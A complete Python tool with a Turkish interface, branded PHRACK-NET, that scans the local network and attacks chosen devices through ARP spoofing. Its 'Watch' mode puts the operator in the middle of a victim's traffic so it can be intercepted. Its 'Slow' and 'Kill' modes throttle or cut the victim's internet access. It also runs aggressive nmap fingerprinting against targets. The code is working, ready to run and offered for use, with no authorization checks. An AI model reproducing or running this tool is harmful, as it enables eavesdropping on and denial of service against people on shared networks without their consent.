#!/usr/bin/env python3

import os
import sys
import time
import signal
import logging
import threading
import subprocess
import socket
import struct
from datetime import datetime
from typing import Optional


def check_and_import():
    missing = []
    try:
        import scapy.all
    except ImportError:
        missing.append("scapy")
    try:
        import nmap
    except ImportError:
        missing.append("python-nmap")

    if missing:
        print("\n[!] Eksik kütüphane(ler): " + ", ".join(missing))
        print("[*] Yüklemek için:\n")
        print("    sudo pip install " + " ".join(missing) + " --break-system-packages\n")
        print("    ya da sanal ortam ile:")
        print("    python -m venv ~/phrack_env && source ~/phrack_env/bin/activate")
        print("    pip install " + " ".join(missing))
        sys.exit(1)

check_and_import()

import scapy.all as scapy
import nmap

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
logging.getLogger("scapy.interactive").setLevel(logging.ERROR)
scapy.conf.verb = 0


class C:
    RST   = '\033[0m'
    BOLD  = '\033[1m'
    DIM   = '\033[2m'
    G     = '\033[92m'
    Y     = '\033[93m'
    R     = '\033[91m'
    B     = '\033[94m'
    CY    = '\033[96m'
    MAG   = '\033[95m'
    GR    = '\033[90m'


def clear(): os.system('clear')

def ts() -> str:
    return datetime.now().strftime('%H:%M:%S')

def separator(char="═", width=70, color=C.B):
    print(f"{color}{char * width}{C.RST}")

def box_line(text: str, width=68, color=C.CY):
    print(f"{color}║  {text:<{width}}{color}║{C.RST}")

def box_top(width=70, color=C.CY):
    print(f"{color}╔{'═' * width}╗{C.RST}")

def box_bot(width=70, color=C.CY):
    print(f"{color}╚{'═' * width}╝{C.RST}")

def set_ip_forward(state: int):
    subprocess.run(
        ["sysctl", "-w", f"net.ipv4.ip_forward={state}"],
        capture_output=True, check=False
    )

def get_default_gateway() -> str:
    try:
        result = subprocess.run(
            ["ip", "route", "show", "default"],
            capture_output=True, text=True
        )
        parts = result.stdout.split()
        if "via" in parts:
            return parts[parts.index("via") + 1]
    except Exception:
        pass
    return "192.168.1.1"

def get_local_network() -> str:
    try:
        result = subprocess.run(
            ["ip", "-o", "-f", "inet", "addr", "show"],
            capture_output=True, text=True
        )
        for line in result.stdout.splitlines():
            parts = line.split()
            if len(parts) >= 4:
                iface = parts[1]
                if iface not in ("lo",):
                    cidr = parts[3]
                    ip, prefix = cidr.split("/")
                    ip_int = struct.unpack("!I", socket.inet_aton(ip))[0]
                    mask = (0xFFFFFFFF << (32 - int(prefix))) & 0xFFFFFFFF
                    net = socket.inet_ntoa(struct.pack("!I", ip_int & mask))
                    return f"{net}/{prefix}"
    except Exception:
        pass
    return "192.168.1.0/24"


class NetworkEngine:
    def __init__(self):
        self.gateway_ip   = get_default_gateway()
        self.target_range = get_local_network()
        self.gateway_mac  = None
        self.is_running   = False
        self.packet_count = 0
        self._lock        = threading.Lock()

    def scan_network(self) -> list[dict]:
        print(f"\n{C.CY}[*] ARP taraması başlatıldı → {self.target_range}{C.RST}")
        print(f"{C.GR}    Gateway: {self.gateway_ip}  •  Timeout: 5s  •  Retry: 2{C.RST}\n")
        try:
            pkt = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=self.target_range)
            answered, _ = scapy.srp(pkt, timeout=5, retry=2, verbose=False)

            devices = []
            for idx, (_, resp) in enumerate(answered):
                ip  = resp[scapy.ARP].psrc
                mac = resp[scapy.Ether].src
                try:
                    hostname = socket.gethostbyaddr(ip)[0]
                except Exception:
                    hostname = "—"
                devices.append({"id": idx, "ip": ip, "mac": mac, "host": hostname})
            return devices
        except PermissionError:
            print(f"{C.R}[!] Yetki hatası — sudo ile çalıştırın.{C.RST}")
            return []
        except Exception as e:
            print(f"{C.R}[!] Tarama hatası: {e}{C.RST}")
            return []

    def resolve_gateway_mac(self) -> Optional[str]:
        mac = scapy.getmacbyip(self.gateway_ip)
        if mac:
            self.gateway_mac = mac
        return mac

    def _send_poison(self, target_ip: str, target_mac: str):
        scapy.sendp(
            scapy.Ether(dst=target_mac) /
            scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=self.gateway_ip),
            verbose=False
        )
        scapy.sendp(
            scapy.Ether(dst=self.gateway_mac) /
            scapy.ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=target_ip),
            verbose=False
        )
        with self._lock:
            self.packet_count += 2

    def _restore_arp(self, target_ip: str, target_mac: str):
        print(f"\n{C.Y}[*] ARP tablosu geri yükleniyor...{C.RST}")
        for _ in range(5):
            scapy.sendp(
                scapy.Ether(dst=target_mac) /
                scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
                           psrc=self.gateway_ip, hwsrc=self.gateway_mac),
                verbose=False
            )
            scapy.sendp(
                scapy.Ether(dst=self.gateway_mac) /
                scapy.ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                           psrc=target_ip, hwsrc=target_mac),
                verbose=False
            )
            time.sleep(0.2)
        set_ip_forward(0)
        print(f"{C.G}[+] ARP geri yüklendi. Hedef normale döndü.{C.RST}")

    def run_watch(self, target_ip: str, target_mac: str):
        if not self.resolve_gateway_mac():
            print(f"{C.R}[-] Gateway MAC çözümlenemedi.{C.RST}")
            return

        set_ip_forward(1)
        self.is_running = True
        self.packet_count = 0

        print(f"\n{C.G}[+] WATCH modu aktif — köprü kuruldu.{C.RST}")
        print(f"{C.GR}    Wireshark filtresi: ip.addr == {target_ip}{C.RST}")
        print(f"{C.GR}    DNS filtresi:       ip.addr == {target_ip} && dns{C.RST}\n")

        last_sizes: list[int] = []

        def traffic_visual(pkt):
            if not self.is_running:
                return
            if pkt.haslayer(scapy.IP):
                size = len(pkt)
                last_sizes.append(size)
                if len(last_sizes) > 30:
                    last_sizes.pop(0)
                avg = sum(last_sizes) / len(last_sizes) if last_sizes else 0
                bar_len = min(int(size / 40), 50)
                if bar_len < 10:
                    col = C.G
                elif bar_len < 28:
                    col = C.Y
                else:
                    col = C.R
                bar = "█" * bar_len + "░" * (50 - bar_len)
                proto = ""
                if pkt.haslayer(scapy.TCP):
                    proto = f"TCP:{pkt[scapy.TCP].dport}"
                elif pkt.haslayer(scapy.UDP):
                    proto = f"UDP:{pkt[scapy.UDP].dport}"
                print(
                    f"\r{C.GR}[{ts()}]{C.RST} {col}{bar}{C.RST} "
                    f"{size:>5}B {C.GR}{proto:<12} avg:{avg:>6.0f}B{C.RST}",
                    end="", flush=True
                )

        def poison_loop():
            while self.is_running:
                self._send_poison(target_ip, target_mac)
                time.sleep(1.5)

        poison_thread = threading.Thread(target=poison_loop, daemon=True)
        poison_thread.start()

        try:
            while self.is_running:
                scapy.sniff(
                    filter=f"host {target_ip}",
                    prn=traffic_visual,
                    count=10,
                    timeout=2,
                    store=False
                )
        except Exception:
            pass
        finally:
            self.is_running = False
            self._restore_arp(target_ip, target_mac)

    def run_slow(self, target_ip: str, target_mac: str):
        if not self.resolve_gateway_mac():
            print(f"{C.R}[-] Gateway MAC çözümlenemedi.{C.RST}")
            return

        set_ip_forward(1)
        self.is_running = True
        self.packet_count = 0

        print(f"\n{C.Y}[+] SLOW modu aktif — trafik yavaşlatılıyor.{C.RST}\n")

        try:
            while self.is_running:
                self._send_poison(target_ip, target_mac)
                cnt = self.packet_count
                print(
                    f"\r{C.Y}[SLOW] Paket: {cnt:<6} | Zaman: {ts()}{C.RST}",
                    end="", flush=True
                )
                time.sleep(3.0)
        finally:
            self.is_running = False
            self._restore_arp(target_ip, target_mac)

    def run_kill(self, target_ip: str, target_mac: str):
        if not self.resolve_gateway_mac():
            print(f"{C.R}[-] Gateway MAC çözümlenemedi.{C.RST}")
            return

        set_ip_forward(0)
        self.is_running = True
        self.packet_count = 0

        print(f"\n{C.R}[+] KILL modu aktif — hedefin internet bağlantısı kesildi.{C.RST}\n")

        try:
            while self.is_running:
                self._send_poison(target_ip, target_mac)
                cnt = self.packet_count
                print(
                    f"\r{C.R}[KILL] Paket: {cnt:<6} | Zaman: {ts()}{C.RST}",
                    end="", flush=True
                )
                time.sleep(0.3)
        finally:
            self.is_running = False
            self._restore_arp(target_ip, target_mac)


class DeepScanner:

    def __init__(self):
        self.nm = nmap.PortScanner()

    def scan(self, target_ip: str):
        clear()
        separator()
        print(f"{C.BOLD}{C.CY}  DEEP SCAN → {target_ip}  [{ts()}]{C.RST}")
        separator()
        print(f"{C.GR}  Argümanlar: -A -T4 -sV -sC -O --traceroute{C.RST}\n")

        try:
            self.nm.scan(
                hosts=target_ip,
                arguments="-A -T4 -sV -sC -O --traceroute"
            )
        except nmap.PortScannerError as e:
            print(f"{C.R}[!] Nmap hatası: {e}{C.RST}")
            return
        except Exception as e:
            print(f"{C.R}[!] Beklenmeyen hata: {e}{C.RST}")
            return

        if target_ip not in self.nm.all_hosts():
            print(f"{C.R}[-] Hedef bulunamadı veya yanıt vermedi.{C.RST}")
            return

        host = self.nm[target_ip]

        box_top()
        box_line(f"IP       : {target_ip}")
        hostnames = ', '.join(h.get('name', '') for h in host.hostnames() if h.get('name')) or '—'
        box_line(f"Hostname : {hostnames}")
        box_line(f"Durum    : {host.state().upper()}")

        if host.get("osmatch"):
            top_os = host["osmatch"][0]
            box_line(f"İşletim S: {top_os['name']} (%{top_os['accuracy']})")
        else:
            box_line("İşletim S: Tespit edilemedi")

        box_bot()

        print(f"\n{C.BOLD}{C.Y}  AÇIK PORTLAR{C.RST}")
        separator("─", 70, C.GR)
        print(f"  {'PORT':<10} {'PROTO':<8} {'DURUM':<12} {'SERVİS':<18} {'VERSİYON'}")
        separator("─", 70, C.GR)

        found_ports = False
        for proto in host.all_protocols():
            ports = sorted(host[proto].keys())
            for port in ports:
                info = host[proto][port]
                if info["state"] == "open":
                    found_ports = True
                    service = info.get("name", "—")
                    version = f"{info.get('product','')} {info.get('version','')} {info.get('extrainfo','')}".strip()
                    version = version[:35] if version else "—"
                    state_col = C.G if info["state"] == "open" else C.R
                    print(
                        f"  {C.BOLD}{port:<10}{C.RST} {proto:<8} "
                        f"{state_col}{info['state']:<12}{C.RST} "
                        f"{C.CY}{service:<18}{C.RST} {version}"
                    )
        if not found_ports:
            print(f"  {C.GR}Açık port bulunamadı.{C.RST}")

        separator("─", 70, C.GR)

        has_scripts = False
        for proto in host.all_protocols():
            for port in sorted(host[proto].keys()):
                info = host[proto][port]
                scripts = info.get("script", {})
                if scripts:
                    if not has_scripts:
                        print(f"\n{C.BOLD}{C.MAG}  NSE SCRIPT SONUÇLARI{C.RST}")
                        separator("─", 70, C.GR)
                        has_scripts = True
                    for sname, sout in scripts.items():
                        print(f"  {C.MAG}[{port}/{sname}]{C.RST}")
                        for line in sout.splitlines()[:6]:
                            print(f"    {C.GR}{line}{C.RST}")

        trace = host.get("trace", {}).get("hops", [])
        if trace:
            print(f"\n{C.BOLD}{C.B}  TRACEROUTE{C.RST}")
            separator("─", 70, C.GR)
            for hop in trace:
                ttl = hop.get("ttl", "?")
                ip  = hop.get("ipaddr", "*")
                rtt = hop.get("rtt", "?")
                print(f"  {C.GR}TTL {ttl:<4}{C.RST} {ip:<20} {rtt}ms")

        print()


class PhrackTerminal:
    def __init__(self):
        self.engine      = NetworkEngine()
        self.scanner     = DeepScanner()
        self.device_list: list[dict] = []
        self._active_thread: Optional[threading.Thread] = None

        signal.signal(signal.SIGINT, self._signal_handler)

    def _signal_handler(self, sig, frame):
        print(f"\n\n{C.Y}[!] Sinyal alındı — temizleniyor...{C.RST}")
        self.engine.is_running = False
        time.sleep(1.5)
        set_ip_forward(0)
        print(f"{C.G}[+] Çıkış tamamlandı.{C.RST}")
        sys.exit(0)

    def banner(self):
        clear()
        print(f"{C.B}{C.BOLD}")
        print("  ╔" + "═" * 66 + "╗")
        print("  ║   ██████╗ ██╗  ██╗██████╗  █████╗  ██████╗██╗  ██╗         ║")
        print("  ║   ██╔══██╗██║  ██║██╔══██╗██╔══██╗██╔════╝██║ ██╔╝         ║")
        print("  ║   ██████╔╝███████║██████╔╝███████║██║     █████╔╝          ║")
        print("  ║   ██╔═══╝ ██╔══██║██╔══██╗██╔══██║██║     ██╔═██╗          ║")
        print("  ║   ██║     ██║  ██║██║  ██║██║  ██║╚██████╗██║  ██╗         ║")
        print("  ║   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝        ║")
        print(f"  ║   {C.CY}PHRACK-NET v12.0 — Network Intelligence Monitor{C.B}           ║")
        print(f"  ║   {C.GR}Gateway: {self.engine.gateway_ip:<18} Ağ: {self.engine.target_range:<20}{C.B}║")
        print(f"  ║   {C.GR}Oturum : {ts():<57}{C.B}║")
        print("  ╚" + "═" * 66 + "╝")
        print(C.RST)

    def print_device_table(self):
        if not self.device_list:
            print(f"  {C.GR}Cihaz bulunamadı. Rescan yapın (r).{C.RST}\n")
            return

        print(f"  {C.BOLD}{'ID':<5} {'IP':<17} {'MAC':<20} {'HOSTNAME'}{C.RST}")
        separator("─", 66, C.GR)
        for d in self.device_list:
            gw_tag = f" {C.Y}[GW]{C.RST}" if d["ip"] == self.engine.gateway_ip else ""
            print(
                f"  {C.CY}{d['id']:<5}{C.RST}"
                f"{C.G}{d['ip']:<17}{C.RST}"
                f"{C.GR}{d['mac']:<20}{C.RST}"
                f"{d['host']}{gw_tag}"
            )
        separator("─", 66, C.GR)
        print()

    def print_menu(self):
        print(f"  {C.BOLD}KOMUTLAR:{C.RST}")
        cmds = [
            ("1", "Deep Scan    ", "Nmap ile kapsamlı cihaz analizi"),
            ("2", "Watch        ", "Şeffaf köprü — trafik izleme (Wireshark uyumlu)"),
            ("3", "Slow         ", "İnternet bağlantısını yavaşlat"),
            ("4", "Kill         ", "İnternet bağlantısını kes"),
            ("r", "Rescan       ", "Ağı yeniden tara"),
            ("q", "Quit         ", "Çıkış"),
        ]
        for key, name, desc in cmds:
            print(f"  {C.CY}[{key}]{C.RST} {C.BOLD}{name}{C.RST} {C.GR}→ {desc}{C.RST}")
        print()

    def pick_target(self) -> Optional[dict]:
        try:
            raw = input(f"  {C.BOLD}Hedef ID > {C.RST}").strip()
            idx = int(raw)
            matches = [d for d in self.device_list if d["id"] == idx]
            if not matches:
                print(f"  {C.R}[!] Geçersiz ID.{C.RST}")
                return None
            return matches[0]
        except (ValueError, IndexError):
            print(f"  {C.R}[!] Geçersiz giriş.{C.RST}")
            return None

    def _start_attack(self, fn, target):
        self.engine.is_running = True
        t = threading.Thread(target=fn, args=(target["ip"], target["mac"]), daemon=True)
        t.start()
        self._active_thread = t

        input(f"\n  {C.G}[ ÇALIŞIYOR ] Durdurmak için ENTER'a basın...{C.RST}\n")
        self.engine.is_running = False
        t.join(timeout=4)

    def run(self):
        if os.geteuid() != 0:
            print(f"{C.R}[!] Bu araç root yetkisi gerektirir.{C.RST}")
            print(f"    sudo python {sys.argv[0]}")
            sys.exit(1)

        self.banner()
        print(f"  {C.CY}[*] İlk ağ taraması başlatılıyor...{C.RST}\n")
        self.device_list = self.engine.scan_network()

        while True:
            self.banner()
            self.print_device_table()
            self.print_menu()

            try:
                cmd = input(f"  {C.BOLD}Komut > {C.RST}").strip().lower()
            except EOFError:
                break

            if cmd == "q":
                print(f"\n{C.G}[+] Çıkış yapılıyor...{C.RST}")
                set_ip_forward(0)
                break

            elif cmd == "r":
                print(f"\n  {C.CY}[*] Yeniden taranıyor...{C.RST}")
                self.device_list = self.engine.scan_network()

            elif cmd == "1":
                target = self.pick_target()
                if target:
                    self.scanner.scan(target["ip"])
                    input(f"\n  {C.GR}[Devam için ENTER]{C.RST}")

            elif cmd in ("2", "3", "4"):
                if not self.device_list:
                    print(f"  {C.R}[!] Önce ağ taraması yapın (r).{C.RST}")
                    time.sleep(1.5)
                    continue

                target = self.pick_target()
                if not target:
                    time.sleep(1.5)
                    continue

                if target["ip"] == self.engine.gateway_ip:
                    print(f"  {C.R}[!] Gateway hedef alınamaz.{C.RST}")
                    time.sleep(1.5)
                    continue

                fn = {
                    "2": self.engine.run_watch,
                    "3": self.engine.run_slow,
                    "4": self.engine.run_kill,
                }[cmd]

                self._start_attack(fn, target)

            else:
                print(f"  {C.R}[!] Geçersiz komut.{C.RST}")
                time.sleep(1)


if __name__ == "__main__":
    terminal = PhrackTerminal()
    terminal.run()
